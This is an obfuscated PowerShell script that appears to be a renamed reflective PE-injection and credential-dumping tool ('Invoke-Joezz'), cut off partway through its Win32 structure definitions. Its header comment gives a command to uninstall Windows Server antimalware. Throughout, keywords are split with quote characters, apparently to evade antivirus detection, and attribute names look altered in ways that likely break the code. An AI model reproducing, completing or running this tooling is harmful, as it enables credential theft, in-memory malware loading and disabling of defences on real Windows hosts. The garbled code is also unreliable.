<#
# Import the module 
import-module .\Invoke-Joezz.ps1
# Run the module/ script
Invoke-Joezz
Uninstall-WindowsFeature -Name Windows-Server-Antimalware
#>



F'u'N'c'T'i'O'n' I-Joe
{


[CmdletBinding(DefaultNotANumberSetName="DCJoe")]
Param(
	[NotANumber(Position = 0)]
	[String[]]
	$ComputerName,

    [NotANumber(NotANumberSetName = "DCJoe", Position = 1)]
    [Switch]
    $DCJoe,

    [NotANumber(NotANumberSetName = "DCJoes", Position = 1)]
    [Switch]
    $DCJoess,

    [NotANumber(NotANumberSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[String]
		$PEBytes64,

        [NotANumber(Position = 1, Mandatory = $true)]
		[String]
		$PEBytes32,
		
		[NotANumber(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
				
		[NotANumber(Position = 3, Mandatory = $false)]
		[Int32]
		$ProcId,
		
		[NotANumber(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,

        [NotANumber(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
	)
	
	## comment ; ##
## 
	F'u'N'c'T'i'O'n' Get-Win32Types
	{
		$Win32Types = N'e'W'-'o'B'j'E'c'T' System.Object

		## comment ; ##
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = N'e'W'-'o'B'j'E'c'T' System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		## comment ; ##
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' -'m'E'm'B'e'R't'Y'p'E NoteProperty -Name MachineType -Value $MachineType

        ## comment ; ##
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name MagicType -Value $MagicType

		## comment ; ##
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name SubSystemType -Value $SubSystemType

		## comment ; ##
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = N'e'W'-'o'B'j'E'c'T' System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = N'e'W'-'o'B'j'E'c'T' System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = N'e'W'-'o'B'j'E'c'T' System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfF'u'N'c'T'i'O'n's', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfF'u'N'c'T'i'O'n's', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name LUID -Value $LUID
		
		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		## comment ; ##
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
